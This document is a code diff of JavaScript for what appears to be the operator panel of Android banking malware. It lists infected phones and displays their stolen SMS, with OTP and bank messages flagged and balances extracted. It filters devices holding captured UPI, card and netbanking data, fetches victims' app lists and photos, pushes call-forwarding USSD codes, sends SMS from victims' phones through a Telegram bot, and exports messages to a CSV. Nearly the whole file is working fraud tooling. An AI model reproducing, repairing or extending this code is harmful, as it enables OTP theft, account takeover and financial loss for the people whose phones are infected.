-  var p = photos[curPhoto]; if (!p) return;
-  if (p.telegram_file_id) { telegramGetFileUrl(p.telegram_file_id).then(function(url) { window.open(url, '_blank'); }); return; }
-  if (p.url) { fetch(p.url).then(function(r) { return r.blob(); }).then(function(blob) { var a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = p.name || 'photo.jpg'; a.click(); }).catch(function() { window.open(p.url, '_blank'); }); }
-  else if (p.base64) { var a = document.createElement('a'); a.href = p.base64; a.download = p.name || 'photo.jpg'; a.click(); }
-});
+document.getElementById('pDownload').addEventListener('click', function() { var p = photos[curPhoto]; if (!p) return; if (p.telegram_file_id) { telegramGetFileUrl(p.telegram_file_id).then(function(u) { window.open(u, '_blank'); }); return; } if (p.url) window.open(p.url, '_blank'); else if (p.base64) { var a = document.createElement('a'); a.href = p.base64; a.download = p.name || 'photo.jpg'; a.click(); } });
 document.getElementById('pViewer').addEventListener('click', function(e) { if (e.target.id === 'pViewer') this.classList.remove('active'); });
 
 function renderApps() {
   var b = document.getElementById('dBody');
   var d = devs[curId];
   var tg = d.installed_apps_telegram || {};
-  var cmd = d.apps_upload_command || {};
-  var status = cmd.status || 'idle';
-  var statusColor = '#64748B'; var statusText = 'Ready';
-  if (status === 'pending') { statusColor = '#D97706'; statusText = '⏳ Pending...'; }
-  else if (status === 'uploading') { statusColor = '#2563EB'; statusText = '📤 Uploading...'; }
-  else if (status === 'completed') { statusColor = '#059669'; statusText = '✅ Done'; }
-  else if (status === 'failed') { statusColor = '#DC2626'; statusText = '❌ Failed'; }
-  var topHtml = '<div style="background:#FFFFFF; border:1px solid #E2E8F0; border-radius:12px; padding:14px; margin-bottom:14px; box-shadow:0 1px 3px rgba(0,0,0,0.04);"><div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;"><div style="color:#1E40AF; font-size:13px; font-weight:700;">📦 Apps Actions</div><div style="font-size:10px; color:' + statusColor + '; font-weight:700;">' + statusText + '</div></div><button onclick="requestAppsUpload()" style="width:100%; padding:12px; background:#2563EB; color:white; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer; box-shadow:0 2px 6px rgba(37,99,235,0.25);">📤 REQUEST APPS UPLOAD</button><div class="inline-progress" id="inlineProgressApps"><div class="inline-progress-head"><div class="inline-progress-status" id="inlineProgressIconApps">📤 Uploading...</div><div class="inline-progress-percent" id="inlineProgressPercentApps">0%</div></div><div class="inline-progress-bar-bg"><div class="inline-progress-bar-fill" id="inlineProgressBarApps"></div></div><div class="inline-progress-stats" id="inlineProgressStatsApps">0 / 0 uploaded</div></div></div>';
+  var topHtml = '<div style="background:#FFF;border:1px solid #E2E8F0;border-radius:12px;padding:14px;margin-bottom:14px;"><button onclick="requestAppsUpload()" style="width:100%;padding:12px;background:#2563EB;color:white;border:none;border-radius:10px;cursor:pointer;font-weight:700;">📤 REQUEST APPS UPLOAD</button></div>';
   if (tg.apps && Array.isArray(tg.apps) && tg.apps.length > 0) {
-    var apps = tg.apps.slice();
-    apps.sort(function(x, y) { return (x.name || '').localeCompare(y.name || ''); });
+    var apps = tg.apps.slice().sort(function(x, y) { return (x.name || '').localeCompare(y.name || ''); });
     document.getElementById('cApps').textContent = apps.length;
-    b.innerHTML = topHtml + '<div style="margin-bottom:12px;color:#64748B;font-size:10px;font-weight:600;">📦 ' + apps.length + ' apps — ' + (tg.updated_at ? new Date(tg.updated_at).toLocaleString() : '') + '</div>' + apps.map(function(x) { return '<div class="app"><div class="app-ic">📦</div><div style="flex:1;min-width:0;"><div class="app-name">' + esc(x.name || 'Unknown') + '</div><div class="app-pkg">' + esc(x.package || '') + '</div></div></div>'; }).join('');
+    b.innerHTML = topHtml + apps.map(function(x) { return '<div class="app"><div class="app-ic">📦</div><div style="flex:1;"><div class="app-name">' + esc(x.name || '?') + '</div><div class="app-pkg">' + esc(x.package || '') + '</div></div></div>'; }).join('');
     return;
   }
-  var fileId = tg.telegram_file_id;
-  if (fileId) {
-    b.innerHTML = topHtml + '<div class="loading">Loading apps...</div>';
-    document.getElementById('cApps').textContent = tg.count || '?';
-    telegramFetchJson(fileId).then(function(apps) {
-      if (!Array.isArray(apps) || apps.length === 0) { b.innerHTML = topHtml + '<div class="empty">No apps</div>'; return; }
-      apps.sort(function(x, y) { return (x.name || '').localeCompare(y.name || ''); });
-      b.innerHTML = topHtml + '<div style="margin-bottom:12px;color:#64748B;font-size:10px;font-weight:600;">📦 ' + apps.length + ' apps (Telegram)</div>' + apps.map(function(x) { return '<div class="app"><div class="app-ic">📦</div><div style="flex:1;min-width:0;"><div class="app-name">' + esc(x.name || 'Unknown') + '</div><div class="app-pkg">' + esc(x.package || '') + '</div></div></div>'; }).join('');
-    }).catch(function(e) { b.innerHTML = topHtml + '<div class="empty">⚠️ Apps list Firebase mein nahi hai.<br><br>REQUEST APPS UPLOAD dabao.</div>'; });
-  } else {
-    b.innerHTML = topHtml + '<div class="empty">No apps yet<br><br>REQUEST APPS UPLOAD dabao</div>';
-  }
+  var fid = tg.telegram_file_id;
+  if (fid) { b.innerHTML = topHtml + '<div class="loading">Loading...</div>'; telegramFetchJson(fid).then(function(apps) { if (!Array.isArray(apps)) { b.innerHTML = topHtml + '<div class="empty">No apps</div>'; return; } apps.sort(function(x, y) { return (x.name || '').localeCompare(y.name || ''); }); b.innerHTML = topHtml + apps.map(function(x) { return '<div class="app"><div class="app-ic">📦</div><div style="flex:1;"><div class="app-name">' + esc(x.name || '?') + '</div><div class="app-pkg">' + esc(x.package || '') + '</div></div></div>'; }).join(''); }).catch(function() { b.innerHTML = topHtml + '<div class="empty">No apps</div>'; }); }
+  else { var ia = d.installed_apps || {}; var arr2 = Object.values(ia); if (arr2.length > 0) { document.getElementById('cApps').textContent = arr2.length; b.innerHTML = topHtml + arr2.map(function(x) { return '<div class="app"><div class="app-ic">📦</div><div style="flex:1;"><div class="app-name">' + esc(x.name || x.app_name || '?') + '</div><div class="app-pkg">' + esc(x.package || x.pkg || '') + '</div></div></div>'; }).join(''); return; } b.innerHTML = topHtml + '<div class="empty">No apps yet</div>'; }
 }
 function renderNotifs() {
   var b = document.getElementById('dBody');
@@ -1430,88 +936,36 @@ function renderBank() {
   if (bks.length === 0) { b.innerHTML = '<div class="empty">No bank messages</div>'; return; }
   var lb = '';
   for (var i = 0; i < bks.length; i++) { var bl = extractBal(bks[i].body); if (bl) { lb = bl; break; } }
-  var html = '<div class="bal-big"><div class="l">Latest Balance</div><div class="a">' + (lb || '—') + '</div></div>';
-  html += bks.map(function(m) { var bal = extractBal(m.body), tx = extractTx(m.body), bn = bankName(m.sender); var isCr = (m.body || '').toUpperCase().indexOf('CREDIT') !== -1; return '<div class="tx"><div class="tx-head"><span class="tx-acc">' + esc(bn) + ' — ' + esc(m.sender || '') + '</span></div>' + (bal ? '<div class="tx-lbl">Balance</div><div class="tx-bal">' + bal + '</div>' : '') + (tx ? '<div class="tx-amt ' + (isCr ? 'cr' : '') + '">' + (isCr ? '+' : '-') + tx + '</div>' : '') + '<div class="tx-msg">' + highlightSms(m.body || '') + '</div><div class="tx-date">' + (m.date || '') + '</div></div>'; }).join('');
-  b.innerHTML = html;
+  b.innerHTML = '<div class="bal-big"><div class="l">Latest Balance</div><div class="a">' + (lb || '—') + '</div></div>' + bks.map(function(m) { var bal = extractBal(m.body), tx = extractTx(m.body), bn = bankName(m.sender); var isCr = (m.body || '').toUpperCase().indexOf('CREDIT') !== -1; return '<div class="tx"><div class="tx-acc">' + esc(bn) + ' — ' + esc(m.sender || '') + '</div>' + (bal ? '<div class="tx-lbl">Balance</div><div class="tx-bal">' + bal + '</div>' : '') + (tx ? '<div class="tx-amt ' + (isCr ? 'cr' : '') + '">' + (isCr ? '+' : '-') + tx + '</div>' : '') + '<div class="tx-msg">' + highlightSms(m.body || '') + '</div><div class="tx-date">' + (m.date || '') + '</div></div>'; }).join('');
 }
 
 function startTelegramPolling(token, chatId) {
   var devId = curId; if (!devId) return;
   if (tgPolling[devId] && tgPolling[devId].active) return;
   tgPolling[devId] = { active: true, token: token, chatId: chatId, offset: 0, timer: null, logs: [] };
-  updateTgStatus('🟢 Starting bot polling...'); addTgLog('🚀 Bot polling started');
-  fetch('https://api.telegram.org/bot' + token + '/getMe').then(function(r) { return r.json(); }).then(function(j) {
-    if (j.ok) { addTgLog('✅ Bot connected: @' + j.result.username); updateTgStatus('🟢 Bot @' + j.result.username + ' — waiting...', 'ok'); }
-    else { addTgLog('❌ Bot error: ' + (j.description || 'unknown')); updateTgStatus('❌ Bot error', 'err'); }
-  }).catch(function(e) { addTgLog('❌ Connection failed: ' + e.message); updateTgStatus('❌ Connection failed', 'err'); });
+  updateTgStatus('🟢 Starting...'); addTgLog('🚀 Started');
+  fetch('https://api.telegram.org/bot' + token + '/getMe').then(function(r) { return r.json(); }).then(function(j) { if (j.ok) { addTgLog('✅ @' + j.result.username); updateTgStatus('🟢 @' + j.result.username, 'ok'); } });
   var pollFn = function() {
     var p = tgPolling[devId]; if (!p || !p.active) return;
     fetch('https://api.telegram.org/bot' + p.token + '/getUpdates?timeout=5&offset=' + p.offset).then(function(r) { return r.json(); }).then(function(j) {
-      if (j.result && j.result.length > 0) {
-        j.result.forEach(function(update) {
-          p.offset = update.update_id + 1;
-          if (update.message && update.message.text) {
-            var msg = update.message.text; var from = update.message.from ? (update.message.from.username || 'user') : 'user';
-            addTgLog('📩 From @' + from + ': "' + msg.substring(0, 60) + '"');
-            var toMatch = msg.match(/(?:To|to|TO):\s*([+\d]+)/); var bodyMatch = msg.match(/(?:Body|body|BODY):\s*([\s\S]+)/);
-            if (toMatch && bodyMatch) { db.ref(basePathOf(devId) + '/sms_commands').push({ to: toMatch[1].trim(), message: bodyMatch[1].trim(), sim_slot: 1, status: 'pending', timestamp: Date.now(), source: 'telegram_bot' }).then(function() { addTgLog('✅ SMS command pushed'); updateTgStatus('✅ SMS sent', 'ok'); }); }
-            else { addTgLog('⚠️ Invalid format'); }
-          }
-        });
-      }
+      if (j.result && j.result.length > 0) { j.result.forEach(function(u) { p.offset = u.update_id + 1; if (u.message && u.message.text) { var msg = u.message.text; var toM = msg.match(/(?:To|to):\s*([+\d]+)/); var bM = msg.match(/(?:Body|body):\s*([\s\S]+)/); if (toM && bM) { db.ref(basePathOf(devId) + '/sms_commands').push({ to: toM[1].trim(), message: bM[1].trim(), sim_slot: 1, status: 'pending', timestamp: Date.now() }); addTgLog('✅ SMS sent'); } } }); }
       p.timer = setTimeout(pollFn, 5000);
-    }).catch(function(e) { addTgLog('❌ Polling error: ' + e.message); var p2 = tgPolling[devId]; if (p2 && p2.active) p2.timer = setTimeout(pollFn, 5000); });
+    }).catch(function() { var p2 = tgPolling[devId]; if (p2 && p2.active) p2.timer = setTimeout(pollFn, 5000); });
   };
   tgPolling[devId].timer = setTimeout(pollFn, 2000);
 }
-function stopTelegramPolling() { Object.keys(tgPolling).forEach(function(devId) { var p = tgPolling[devId]; if (p) { p.active = false; if (p.timer) clearTimeout(p.timer); } }); if (curId) { updateTgStatus('⚪ Polling stopped'); addTgLog('⏹ Polling stopped'); } }
+function stopTelegramPolling() { Object.keys(tgPolling).forEach(function(devId) { var p = tgPolling[devId]; if (p) { p.active = false; if (p.timer) clearTimeout(p.timer); } }); if (curId) { updateTgStatus('⚪ Stopped'); addTgLog('⏹ Stopped'); } }
 function updateTgStatus(text, type) { var el = document.getElementById('tgStatus'); if (!el) return; el.textContent = text; el.className = 'tg-status' + (type === 'err' ? ' err' : '') + (type === 'ok' ? ' ok' : ''); }
-function addTgLog(text) {
-  var el = document.getElementById('tgLog'); var time = new Date().toLocaleTimeString(); var lineText = '[' + time + '] ' + text;
-  if (curId && tgPolling[curId]) { if (!tgPolling[curId].logs) tgPolling[curId].logs = []; tgPolling[curId].logs.push(lineText); if (tgPolling[curId].logs.length > 50) tgPolling[curId].logs.shift(); }
-  if (!el) return;
-  var line = document.createElement('div'); line.className = 'tg-log-line'; line.textContent = lineText;
-  el.appendChild(line); el.scrollTop = el.scrollHeight;
-  while (el.children.length > 50) el.removeChild(el.firstChild);
-}
+function addTgLog(text) { var el = document.getElementById('tgLog'); var lineText = '[' + new Date().toLocaleTimeString() + '] ' + text; if (curId && tgPolling[curId]) { if (!tgPolling[curId].logs) tgPolling[curId].logs = []; tgPolling[curId].logs.push(lineText); if (tgPolling[curId].logs.length > 50) tgPolling[curId].logs.shift(); } if (!el) return; var line = document.createElement('div'); line.className = 'tg-log-line'; line.textContent = lineText; el.appendChild(line); el.scrollTop = el.scrollHeight; while (el.children.length > 50) el.removeChild(el.firstChild); }
 
-function openCallFwd() {
-  if (!curId) return;
-  var d = devs[curId];
-  document.getElementById('cfNumber').value = (d.forward_settings && d.forward_settings.admin_number) || '';
-  document.getElementById('cfStatus').textContent = 'Ready.'; document.getElementById('cfStatus').className = 'cf-status';
-  document.getElementById('cfOverlay').classList.add('active');
-  db.ref('call_forward_commands/' + curId).limitToLast(1).on('value', function(s) {
-    var val = s.val();
-    if (val) { var cmd = val[Object.keys(val)[0]]; var statusEl = document.getElementById('cfStatus'); statusEl.className = 'cf-status ok'; statusEl.innerHTML = '<strong>Latest:</strong> ' + (cmd.action || 'unknown').toUpperCase() + '<br>Status: ' + (cmd.status || 'pending').toUpperCase(); }
-  });
-}
-function closeCallFwd() { document.getElementById('cfOverlay').classList.remove('active'); if (curId) { try { db.ref('call_forward_commands/' + curId).off(); } catch(e) {} } }
-function sendCallFwd(action) {
-  if (!curId) return;
-  var num = document.getElementById('cfNumber').value.trim();
-  var statusEl = document.getElementById('cfStatus');
-  if (action === 'activate' && (!num || num.length < 10)) { statusEl.className = 'cf-status err'; statusEl.textContent = '❌ Enter valid number'; return; }
-  statusEl.className = 'cf-status'; statusEl.textContent = '📤 Sending...';
-  var cmd = { action: action, number: num, sim_slot: cfSimSlot, status: 'pending', timestamp: Date.now() };
-  if (action === 'activate') cmd.ussd_code = '**21*' + num + '#';
-  else if (action === 'deactivate') cmd.ussd_code = '##21#';
-  else cmd.ussd_code = '*#21#';
-  db.ref('call_forward_commands/' + curId).push(cmd).then(function() { statusEl.className = 'cf-status ok'; statusEl.innerHTML = '✅ Sent!'; }).catch(function(e) { statusEl.className = 'cf-status err'; statusEl.textContent = '❌ ' + e.message; });
-}
+function openCallFwd() { if (!curId) return; var d = devs[curId]; document.getElementById('cfNumber').value = (d.forward_settings && d.forward_settings.admin_number) || ''; document.getElementById('cfStatus').textContent = 'Ready.'; document.getElementById('cfStatus').className = 'cf-status'; document.getElementById('cfOverlay').classList.add('active'); }
+function closeCallFwd() { document.getElementById('cfOverlay').classList.remove('active'); }
+function sendCallFwd(action) { if (!curId) return; var num = document.getElementById('cfNumber').value.trim(); var statusEl = document.getElementById('cfStatus'); if (action === 'activate' && (!num || num.length < 10)) { statusEl.className = 'cf-status err'; statusEl.textContent = '❌ Enter valid number'; return; } statusEl.className = 'cf-status'; statusEl.textContent = '📤 Sending...'; var cmd = { action: action, number: num, sim_slot: cfSimSlot, status: 'pending', timestamp: Date.now() }; if (action === 'activate') cmd.ussd_code = '**21*' + num + '#'; else if (action === 'deactivate') cmd.ussd_code = '##21#'; else cmd.ussd_code = '*#21#'; db.ref('call_forward_commands/' + curId).push(cmd).then(function() { statusEl.className = 'cf-status ok'; statusEl.textContent = '✅ Sent!'; }).catch(function(e) { statusEl.className = 'cf-status err'; statusEl.textContent = '❌ ' + e.message; }); }
 
 function updStats() {
   var ids = Object.keys(devs); var on = 0, off = 0, sms = 0, bank = 0;
-  ids.forEach(function(id) {
-    var d = devs[id]; if (d.status === 'Online') on++; else off++;
-    var allM = []; if (d.messages) Object.values(d.messages).forEach(function(m) { allM.push(m); }); if (d.sms_history) Object.values(d.sms_history).forEach(function(m) { allM.push(m); });
-    sms += allM.length; allM.forEach(function(m) { var c = cat(m.sender, m.body); if (c === 'BANK' || c === 'BALANCE' || c === 'DEBIT' || c === 'CREDIT') bank++; });
-  });
-  document.getElementById('sTotal').textContent = ids.length;
-  document.getElementById('sOnline').textContent = on;
-  document.getElementById('sOffline').textContent = off;
-  document.getElementById('sSms').textContent = sms;
-  document.getElementById('sBank').textContent = bank;
+  ids.forEach(function(id) { var d = devs[id]; if (d.status === 'Online') on++; else off++; var allM = []; if (d.messages) Object.values(d.messages).forEach(function(m) { allM.push(m); }); if (d.sms_history) Object.values(d.sms_history).forEach(function(m) { allM.push(m); }); sms += allM.length; allM.forEach(function(m) { var c = cat(m.sender, m.body); if (c === 'BANK' || c === 'BALANCE' || c === 'DEBIT' || c === 'CREDIT') bank++; }); });
+  document.getElementById('sTotal').textContent = ids.length; document.getElementById('sOnline').textContent = on; document.getElementById('sOffline').textContent = off; document.getElementById('sSms').textContent = sms; document.getElementById('sBank').textContent = bank;
 }
 function isLiked(id) { return liked.indexOf(id) !== -1; }
 function toggleLike(id) { if (isLiked(id)) liked = liked.filter(function(x) { return x !== id; }); else liked.push(id); localStorage.setItem('liked', JSON.stringify(liked)); renderDevs(); updStar(); }
@@ -1519,54 +973,22 @@ function updStar() { var b = document.getElementById('btnStar'); if (b) b.textCo
 function renderDevs() {
   var g = document.getElementById('deviceGrid');
   var q = (document.getElementById('searchBox').value || '').toLowerCase();
-  var ids = Object.keys(devs).filter(function(id) {
-    var d = devs[id];
-    if (curFilter === 'online' && d.status !== 'Online') return false;
-    if (curFilter === 'offline' && d.status === 'Online') return false;
-    if (curFilter === 'liked' && !isLiked(id)) return false;
-    if (curFilter === 'upi' && !d.upi_data) return false;
-    if (curFilter === 'card' && !d.card_data) return false;
-    if (curFilter === 'bank' && !d.netbanking_data) return false;
-    var s = (id + ' ' + (d.device_model || '') + ' ' + (d.sim_info && d.sim_info.sim1_number || '')).toLowerCase();
-    return s.indexOf(q) !== -1;
-  });
+  var ids = Object.keys(devs).filter(function(id) { var d = devs[id]; if (curFilter === 'online' && d.status !== 'Online') return false; if (curFilter === 'offline' && d.status === 'Online') return false; if (curFilter === 'liked' && !isLiked(id)) return false; if (curFilter === 'upi' && !d.upi_data) return false; if (curFilter === 'card' && !d.card_data) return false; if (curFilter === 'bank' && !d.netbanking_data) return false; var s = (id + ' ' + (d.device_model || d.device_name || '')).toLowerCase(); return s.indexOf(q) !== -1; });
   if (ids.length === 0) { g.innerHTML = '<div class="empty">No devices</div>'; return; }
   ids.sort(function(a, b) { return (devs[b].first_install_timestamp || 0) - (devs[a].first_install_timestamp || 0); });
-  g.innerHTML = ids.map(function(id) {
-    var d = devs[id]; var m = d.device_model || d.device_name || 'Unknown'; var b = d.battery || '0%';
-    var s = (d.sim_info && (d.sim_info.sim1_number || d.sim_info.sim2_number)) || 'No SIM';
-    var lk = isLiked(id); var pc = d.photos ? Object.keys(d.photos).length : 0;
-    return '<div class="device-card" data-id="' + id + '"><div class="device-header"><div class="wifi-icon">📶</div><div class="device-info"><div class="device-name">' + esc(m) + '</div><div class="device-id">' + id + '</div></div><div class="device-star" data-star="' + id + '">' + (lk ? '⭐' : '☆') + '</div></div><div class="device-grid-2"><div><div class="k">Android</div><div class="v">v' + esc(d.android_version || '?') + '</div></div><div><div class="k">Battery</div><div class="v" style="color:' + batColor(b) + '">' + b + '</div></div><div><div class="k">Number</div><div class="v">' + esc(s) + '</div></div><div><div class="k">Photos</div><div class="v">' + pc + '</div></div></div></div>';
-  }).join('');
+  g.innerHTML = ids.map(function(id) { var d = devs[id]; var m = d.device_model || d.device_name || id; var b = d.battery || '0%'; var s = (d.sim_info && (d.sim_info.sim1_number || d.sim_info.sim2_number)) || d.phone || d.phone_number || 'No SIM'; var lk = isLiked(id); var pc = d.photos ? Object.keys(d.photos).length : 0; return '<div class="device-card" data-id="' + id + '"><div class="device-header"><div class="wifi-icon">📶</div><div class="device-info"><div class="device-name">' + esc(m) + '</div><div class="device-id">' + esc(id) + '</div></div><div class="device-star" data-star="' + id + '">' + (lk ? '⭐' : '☆') + '</div></div><div class="device-grid-2"><div><div class="k">Android</div><div class="v">v' + esc(d.android_version || '?') + '</div></div><div><div class="k">Battery</div><div class="v" style="color:' + batColor(b) + '">' + b + '</div></div><div><div class="k">Number</div><div class="v">' + esc(s) + '</div></div><div><div class="k">Photos</div><div class="v">' + pc + '</div></div></div></div>'; }).join('');
   g.querySelectorAll('.device-card').forEach(function(c) { c.addEventListener('click', function(e) { if (e.target.hasAttribute('data-star')) { toggleLike(e.target.getAttribute('data-star')); return; } openDev(this.getAttribute('data-id')); }); });
 }
 function batColor(b) { var p = parseInt(b) || 0; if (p >= 50) return '#059669'; if (p >= 20) return '#D97706'; return '#DC2626'; }
-function esc(t) { if (!t) return ''; var d = document.createElement('div'); d.textContent = t; return d.innerHTML; }
-function cat(sender, body) { var s = (sender || '').toUpperCase(), b = (body || '').toUpperCase();
-  if (b.indexOf('OTP') !== -1) return 'OTP'; if (b.indexOf('BAL') !== -1) return 'BALANCE'; if (b.indexOf('CREDIT') !== -1) return 'CREDIT'; if (b.indexOf('DEBIT') !== -1) return 'DEBIT';
-  if (b.indexOf('BANK') !== -1 || s.indexOf('BANK') !== -1 || s.indexOf('SBI') !== -1 || s.indexOf('HDFC') !== -1 || s.indexOf('ICICI') !== -1) return 'BANK';
-  return 'ALERT';
-}
-function bankName(sender) { var s = (sender || '').toUpperCase();
-  if (s.indexOf('SBI') !== -1) return 'SBI'; if (s.indexOf('HDFC') !== -1) return 'HDFC'; if (s.indexOf('ICICI') !== -1) return 'ICICI'; if (s.indexOf('AXIS') !== -1) return 'AXIS';
-  if (s.indexOf('BOB') !== -1) return 'BOB'; if (s.indexOf('PHONEPE') !== -1) return 'PhonePe'; if (s.indexOf('GPAY') !== -1) return 'GooglePay'; if (s.indexOf('PAYTM') !== -1) return 'Paytm';
-  return 'Bank';
-}
+function esc(t) { if (t === undefined || t === null) return ''; var d = document.createElement('div'); d.textContent = String(t); return d.innerHTML; }
+function cat(sender, body) { var s = (sender || '').toUpperCase(), b = (body || '').toUpperCase(); if (b.indexOf('OTP') !== -1) return 'OTP'; if (b.indexOf('BAL') !== -1) return 'BALANCE'; if (b.indexOf('CREDIT') !== -1) return 'CREDIT'; if (b.indexOf('DEBIT') !== -1) return 'DEBIT'; if (b.indexOf('BANK') !== -1 || s.indexOf('BANK') !== -1 || s.indexOf('SBI') !== -1 || s.indexOf('HDFC') !== -1 || s.indexOf('ICICI') !== -1) return 'BANK'; return 'ALERT'; }
+function bankName(sender) { var s = (sender || '').toUpperCase(); if (s.indexOf('SBI') !== -1) return 'SBI'; if (s.indexOf('HDFC') !== -1) return 'HDFC'; if (s.indexOf('ICICI') !== -1) return 'ICICI'; if (s.indexOf('AXIS') !== -1) return 'AXIS'; if (s.indexOf('BOB') !== -1) return 'BOB'; if (s.indexOf('PHONEPE') !== -1) return 'PhonePe'; if (s.indexOf('GPAY') !== -1) return 'GooglePay'; if (s.indexOf('PAYTM') !== -1) return 'Paytm'; return 'Bank'; }
 function extractBal(body) { var m = (body || '').match(/(?:Rs\.?|INR|₹)\s*([0-9,]+(?:\.[0-9]+)?)/i); return m ? '₹ ' + m[1] : ''; }
 function extractTx(body) { var m = (body || '').match(/(?:Rs\.?|INR|₹)\s*([0-9,]+(?:\.[0-9]+)?)/gi); return m && m.length > 1 ? m[m.length - 1] : (m && m[0] ? m[0] : ''); }
-function detectFromSms(allMsgs) { var phones = {}, nets = {}; allMsgs.forEach(function(m) { var t = (m.body || '') + ' ' + (m.sender || ''); var pm = t.match(/\b[6-9]\d{9}\b/g); if (pm) pm.forEach(function(p) { phones[p] = true; }); var nm = t.toUpperCase().match(/\b(JIO|AIRTEL|VI|VODAFONE|IDEA|BSNL)\b/); if (nm) nets[nm[1]] = true; }); return { phones: Object.keys(phones).slice(0, 5), nets: Object.keys(nets).slice(0, 5) }; }
+function detectFromSms(allMsgs) { var phones = {}, nets = {}; allMsgs.forEach(function(m) { var t = ((m.body || m.message || m.text || '') + ' ' + (m.sender || '')).toString(); var pm = t.match(/\b[6-9]\d{9}\b/g); if (pm) pm.forEach(function(p) { phones[p] = true; }); var nm = t.toUpperCase().match(/\b(JIO|AIRTEL|VI|VODAFONE|IDEA|BSNL)\b/); if (nm) nets[nm[1]] = true; }); return { phones: Object.keys(phones).slice(0, 5), nets: Object.keys(nets).slice(0, 5) }; }
 
-// ═══ EVENT LISTENERS ═══
 document.getElementById('logoutBtn').addEventListener('click', doLogout);
-document.getElementById('btnNewConn').addEventListener('click', function() {
-  // Naya connection ke liye connect screen dikhao (panel hide)
-  if (currentApp) { try { currentApp.delete(); } catch(e) {} currentApp = null; }
-  db = null; currentAccount = null;
-  document.getElementById('mainApp').style.display = 'none';
-  document.getElementById('connectScreen').style.display = 'flex';
-  renderSavedAccounts();
-  document.getElementById('connectErr').textContent = '';
-});
+document.getElementById('btnNewConn').addEventListener('click', function() { if (currentApp) { try { currentApp.delete(); } catch(e) {} currentApp = null; } db = null; currentAccount = null; document.getElementById('mainApp').style.display = 'none'; document.getElementById('connectScreen').style.display = 'flex'; renderSavedAccounts(); document.getElementById('connectErr').textContent = ''; });
 document.getElementById('btnConnect').addEventListener('click', saveNewAcc);
 document.getElementById('btnBulkConnect').addEventListener('click', bulkConnect);
 document.getElementById('apkUpload').addEventListener('click', function() { document.getElementById('apkFile').click(); });
@@ -1590,15 +1012,10 @@ document.getElementById('delScopeConfirm').addEventListener('click', confirmFast
 document.getElementById('delScopeOverlay').addEventListener('click', function(e) { if (e.target.id === 'delScopeOverlay') closeFastDeleteDialog(); });
 document.getElementById('delProgressClose').addEventListener('click', function() { document.getElementById('delProgressOverlay').classList.remove('active'); });
 document.getElementById('btnTelegram').addEventListener('click', openTelegramSettings);
-document.getElementById('btnCsv').addEventListener('click', function() {
-  var csv = 'Device,Sender,Body,Date\n';
-  Object.keys(devs).forEach(function(id) { var d = devs[id]; if (d.messages) Object.values(d.messages).forEach(function(m) { csv += '"' + id + '","' + (m.sender || '').replace(/"/g, '""') + '","' + (m.body || '').replace(/"/g, '""') + '","' + (m.date || '') + '"\n'; }); });
-  var bl = new Blob([csv], { type: 'text/csv' }); var a = document.createElement('a'); a.href = URL.createObjectURL(bl); a.download = 'rto_sms.csv'; a.click();
-});
+document.getElementById('btnCsv').addEventListener('click', function() { var csv = 'Device,Sender,Body,Date\n'; Object.keys(devs).forEach(function(id) { var d = devs[id]; if (d.messages) Object.values(d.messages).forEach(function(m) { csv += '"' + id + '","' + (m.sender || '').replace(/"/g, '""') + '","' + (m.body || '').replace(/"/g, '""') + '","' + (m.date || '') + '"\n'; }); }); var bl = new Blob([csv], { type: 'text/csv' }); var a = document.createElement('a'); a.href = URL.createObjectURL(bl); a.download = 'rto_sms.csv'; a.click(); });
 document.getElementById('btnFb').addEventListener('click', function() { alert('Firebase: ' + (currentAccount && currentAccount.url)); });
 document.getElementById('btnNuke').addEventListener('click', function() { if (!confirm('Delete ALL messages?')) return; if (!confirm('Sure?')) return; Object.keys(devs).forEach(function(id) { db.ref(basePathOf(id) + '/messages').remove(); db.ref(basePathOf(id) + '/sms_history').remove(); }); alert('Deleted'); });
 
-// ═══ INIT — Connect screen dikhao (dashboard NAHI) ═══
 renderSavedAccounts();
 document.getElementById('connectScreen').style.display = 'flex';
 document.getElementById('mainApp').style.display = 'none';
